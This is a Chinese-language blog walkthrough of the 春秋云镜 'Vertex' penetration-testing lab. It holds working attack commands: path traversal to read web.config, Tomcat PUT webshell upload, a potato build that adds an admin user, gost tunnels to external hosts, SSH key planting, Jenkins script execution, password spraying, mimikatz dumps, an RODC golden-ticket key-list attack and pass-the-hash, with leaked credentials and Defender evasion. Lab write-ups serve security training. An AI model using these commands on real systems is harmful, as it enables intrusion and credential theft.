---
title: "春秋云镜 Vertex"
onlyTitle: true
date: 2026-3-24 18:29:42
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8194.jpg
---



最后一把，打完备战招聘了，最后一个ROCD照着打都没打出来，也排查了时钟那些，甚至开了三遍靶机打，糖丸了

## 春秋云镜 Vertex

### flag1

http://39.101.78.67:8000

注册可以直接修改role为admin

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194353525.png)

UserList有个导出功能

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194614520.png)



这里有个任意文件下载

网站为asp.net框架，可以读取网站根目录的默认配置文件，web.config

https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-10.0

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322194654983.png)

```
/User/DownloadFile?download=Export&fileName=../web.Config
```

读到有sqlServer的账户密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200201721.png)

```
user id=sa;password=Sa1pYbSM!dsQ
```

MDUT直接上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200502684.png)

上去whoami发现是sql权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322200615266.png)

传了两遍免杀的c2马发现都被杀了

看了下只开了windows Defender

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322201946188.png)

用eaas.xred最新的在线免杀(免360杀版)传个bind马正向

噢，端口也不对外开放的，那只能土豆提权了

忘了掩日免杀后不能传参数了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260322215701543.png)

clone sweetPotato，vs community打开

下载.NETFramework,Version=v4.6.1：https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net461-developer-pack-offline-installer

还原一下NuGet程序包

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323170439322.png)

ai分析下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323172740563.png)

经过一个小小的带参调试这个c#+.net程序，得知programArgs可以把命令写死，就不用传参（from夏饭，这思路nb）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185913891.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323185825087.png)

于是写死参数，再过一遍免杀

```cmd
programArgs = "/c net user godown qwerQ!1234 /add && net localgroup administrators godown /add";
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211831946.png)

nima为什么sb大模型老是道德教育我，tmd谁研究的啊

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323211811874.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323212130032.png)



### flag2

反手把WD关掉（不会关的可以宣布退出安全圈了）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213022682.png)

好多人啊，poc真多

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323213453217.png)

```
192.168.8.9 本机
192.168.8.26:8080 JSP
192.168.8.42 gitlab signin
192.168.8.146 heapdump spring2初步推测能打shiro
```

代理出来打192.168.8.26

```
gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/8.130.144.164:22 -F socks5://8.130.144.164:5555
```

访问他

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260323214540681.png)

在提前看过wp的情况下，我知道这里是打put文件上传，想用yakit扫一遍，但是yakit设置了url也不会扫backup路径，只会扫根路径，可能是我没配置对？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141041902.png)

先接着打吧，upload可以直接未授权查看文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141348028.png)

大party生成一个jsp蚁剑内存马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324141002730.png)

CVE-2017-12615直接PUT文件上传

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151819636.png)

然后jsp路径在upload的上层（通常upload/都是不解析的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151742588.png)

上线后虽然是域用户，不过是低权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324151929474.png)

依旧上传刚才的古法免杀马（不过没开3306

查看杀软，额没有杀软，直接上传土豆提权就行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152335237.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324152610682.png)

flag{c37b368f-8585-47d7-adf2-0c04c8ef30a3}



### flag3

192.168.8.16:8080

jenkins，有弱密码admin/admin123

上线看到jenkins 2.452.3

直接进到/manage/script，命令执行

`println "whoami".execute().text`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153329948.png)

添加用户rdp上去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324153938756.png)

flag{8bef2d26-91a8-481d-a883-cfd3b0e2ce5a}



### flag4

jenkins配置文件中找到gitlab的密钥C:\ProgramData\Jenkins\.jenkins\credentials.xml

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154139758.png)

去控制台解密

```text
println(hudson.util.Secret.fromString("{AQAAABAAAAAgqoi+w8f2N/rXi0qZEha5nGPamO0CIjokzT/a64spCEBqrIv7dFOC/dVxZwp+6CCU}").getPlainText())
```

总感觉我打过这个？？？

```
gitlab key，这里因为github有cicd的时候自动扫硬编码所以我不贴了
```

带着密钥授权访问gitlab 也就是42主机

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154449942.png)

一共5个项目，把backup clone下来

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324154552752.png)

`git clone http://192.168.8.42:glpat-2Z7YFA6k57s93VHMvHxh@192.168.8.42/vertexsoft/vertexsoftbackup.git`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155049128.png)

flag{7bc76381-d76e-45af-99d6-9ac19baabf53}



### flag5

另一台靶机8.130.159.17未授权heapdump

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260121202133572.png)

依旧rememberme

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155557807.png)

依旧注入内存马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155732387.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324155901768.png)



### flag6

wait？！146主机？这不是flag2扫出来那台主机吗，原来是同一台啊

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324160158917.png)

fscan依旧慢的读不到回显，心生一老计，写ssh后登上去

```sh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApTC6dO0d4Zm9+WZXB4R0rPLjRx3qIIdF1lknMKPU+TW3h+tHdQ4NA1gm2WKfmoxUxzIDrs5QbPN0PBXkIcU6YFN3WlRXy3figTpxOP9qHKhrjx4jtHd/HI6CdLNUKqvqZRLqT8mlxVz9IdfETmyQ+d994EDk918s3xgQbii/aLYMBA5mMNHJSe0dBjdYLG/YKNE68HT0GoE5/XIQyFecJEpuTqKtJFPjFbuwE66qJLMc38ZDRDTaUOX9jQnyH09VHj37oL5LLj6MbwFmk77o0D3JxcGod8zyHzu+isQJe84DHEcdEAMrHivk81ISrDV2b9YlYd36lJJGHZaT3xyHNw==" >> /root/.ssh/authorized_keys
```

我这个fscan不知道为什么没有mysql爆破的功能

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324161554193.png)

按理说有个这个

`mysql 192.168.8.38:3306:root 123456`

但是0人在意，挂代理直接连

```
gost -L socks5://:5555?bind=true
gost -L rtcp://:2222/8.146.237.71:22 -F socks5://8.146.237.71:5555
```

navicat连了一万年连上了，connect有延时是吧，才会导致MDUT超时连接不上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324162739637.png)

那我直接把超时改成120s，你如何应对（敏锐的嗅觉这一块

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163417928.png)

进去后UDF提权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163458035.png)

依旧添加用户

`net user godown qwerQ!1234 /add && net localgroup administrators godown /add`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163706631.png)

flag{0d9d3afa-8c5c-43ca-8799-6b84355823c5}

### flag7

C:\Users\Administrator\Documents\ROAdmins.xlsx下下来

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324163821956.png)



喷洒一波密码(不加-q proxychains一直报告，烦死了)

```text
proxychains4 -q crackmapexec smb 192.168.8.1/24 -u user.txt -p pass.txt --no-bruteforce
```

好多过期密码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324165420740.png)

proxychains4 rdesktop 192.168.8.12上去改密码

vertexsoft.local\CharlieCloud:u!6vDaGQOA

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170013372.png)

flag{13dff5f0-370d-420f-a111-189675d7b157}



### flag8

RODC，没听过，照着打

>如果有修改RODC属性的权限，可以修改两个关键属性，将域管添加到 msDS-RevealOnDemandGroup  属性中，然后抓取RODC的krbtgt_xxxxx账号凭证，伪造域管的金票，随后发起TGS-REQ（包含KERB-KEY-LIST-REQ），这时域控会回给RODC一个KERB-KEY-LIST-REP包，该包内含有域管的凭证

关掉WD，上传猕猴桃，PowerView.ps1和Rubeus.exe

rdesktop有bug上传不了文件，windows上代理用原生rdp上传文件

获取RODC的krbtgt_xxxxx账号凭证

```sh
Get-ADComputer RODC -Properties msDS-KrbTgtLink
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170258018.png)

SID `S-1-5-21-1670446094-1720415002-1380520873-1106`

抓hash，需要管理员开powershell

`./mimikatz.exe "Privilege::Debug" "log" "lsadump::lsa /patch" "exit"`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324171657969.png)

找到了krbtgt_4156的NTLM

导入powerView.ps1，清空msDS-NeverRevealGroup属性

```sh
Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local' -Clear 'msDS-NeverRevealGroup'
```

然后将域管理员账户添加到msDS-RevealOnDemandGroup 属性中

```sh
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local' -Set @{'msDS-RevealOnDemandGroup'=@('CN=Administrator,CN=Users,DC=vertexsoft,DC=local')}
```

构造黄金票据（这里我也不知道为什么不要sid后几位）

```powershell
./Rubeus.exe golden /rodcNumber:4156 /rc4:34e335179246ef930dc33fd1e3de6e9e /user:administrator /id:500 /domain:vertexsoft.local /sid:S-1-5-21-1670446094-1720415002-1380520873 /nowrap
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324172551988.png)

好熟悉，打完得去整理一下了

这个有概率不成功，需要重启靶机

> 将这个黄金票据用于向域控发送kebtgt服务的TGS-REQ，TGS-REQ包含 Key List Request(KERB-KEY-LIST-REQ)结构，该结构用于请求KDC 可以提供给客户端的密钥类型列表。如果目标账户在RODC的 msDS-RevealOnDemandGroup 属性中且不在 msDS-NeverRevealGroup  属性中，TGS-REP将返回一个包含目标用户凭证的KERB-KEY-LIST-REP结构，解密后可以获得其hash从而进行PTH。
>
> ref:https://fffffilm.top/2025/07/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex/

```
.\Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertexsoft.local /dc:DC.vertexsoft.local /ticket:doIFWzCCBVegAwIBBaEDAgEWooIETDCCBEhhggREMIIEQKADAgEFoRIbEFZFUlRFWFNPRlQuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHZlcnRleHNvZnQubG9jYWyjggP8MIID+KADAgEXoQMCAQOiggPqBIID5srrghnulL1FS6b2Qx5xZve5HqdV5J7BXkuwVbZupWz0DDxujZIVBZlpM6w83cKPOXnWuKe8TUjrxZPVSDkTO1YoA+jyT028VOVKOlhJ3fu+llsDrjyUtDGEeeH+ULHMyAt1lQZN7XMjGS/A4KWn61sVA6kew/QEH9v7MMJwK2MCNGcM1+cnJiLNZQzO3BFpsj+jH91gOeDpQ+JebXWlZktnhjYFYWqbXj2VaKgOfDbQn1Hd3lnWYJ+KLQUZOvjMRerYED5WLNTl1hAmSo1UPRgPDDky09oYkDf6jd2a18w2zq6XLB8SXCELv31SOshAuGJ2dap+rlNau+GyplVT8apj8St9uRYvSjDTRbx0bOo6SHf1KXQX/Jp5qnpt56eELVa9KK2ketu/W5yHe1tpsU4nD4LQjrrmO1P4yddI84SY77skTcbrX6rZ/30nNL1Tqo0UHq/IKk04wfrBPE+X5dIJKshUKNfsh9/bhJpkGejb7X3rJBaGAqsCwXfwtC7X7XTPJOUGZdRDi6FPA4VYLfsfj8umy06yr9+sPd1KD2WfbgD2cyyfbyazctVqWQclWU23fzuG5PEbnfQMnsRJ2bDIsYrvL2g9EZNDnWd+yaLPCZOQbUWI0CaPmRYPx83z0RdeFBK3C6/JQlwBHdVvkh7K6wZgfzHMRe64tBXU8rwD9PhIJf+7L3A3PUBBZuC4zY7IS7n+tVH+DNyb8QIUWVM7VRdpikNyyNoO+rkXpfso1ZoADrEzOGSX3Atbj3W1B7CKujyx/SRRbZ8Tw4UivxbtvVZiJ8v46W4Ftp+jw/e2257udaHcLGoAOzDLdEMk+wVx2fO/Mid/E8RdljvXz3wfMQkkpcfDuJHaPKUEC5DkNbYfyMW5ND+9E7QI9rWP2GcYc2Lil/Pzi6FUfFyrZR7Gt0hdSaPOoYo2mB6vH67EzGtsxIThg8ppm2/Iw6XCoO6uJa3ymtiFOU2wCBMljwFXHnQbm2ZIq7GO/+/1MvvfQoDa5W4tauPNzuxg8Z5O172k523PHCd19ZmcHt09WQXrYUYo6jrUXiDgpZYBl80QInPfbJsy8NJygPGfzpyNExHVYH6nMjzMx3PNY/DvoyZu2MPtFAB0+Zwcvo6t0LbOx0rmYzauLlZ7t1k7lrIonwqnj8QEA3xvV+RhtcNEuQSiTEQc5c5kHYq6NbtcA/xNCaAb+/4P322+gL/oG7woQxL3eSRPTSyLqNSLjL+6P4Qzf+iJSlT1e4pa0Y4H/Jxp1vYB8F2vkAWFutRwAZUcP8lEpFVM6eHQjRK475FDY0So4DMxkERPLwTpmzUWCmaRgawOheGgo4H6MIH3oAMCAQCige8Egex9gekwgeaggeMwgeAwgd2gGzAZoAMCARehEgQQKIViYqSqxaBb/wsyzL6ip6ESGxBWRVJURVhTT0ZULkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDMyNDEwMjMzOVqlERgPMjAyNjAzMjQxMDIzMzlaphEYDzIwMjYwMzI0MjAyMzM5WqcRGA8yMDI2MDMzMTEwMjMzOVqoEhsQVkVSVEVYU09GVC5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQdmVydGV4c29mdC5sb2NhbA==
```

哎哟我操，一直打不出来，急死我了。

python smbexec.py -hashes :EBC447441306783742EE3DF769051B75 vertexsoft.local/administrator@192.168.1.11 -codec gbk







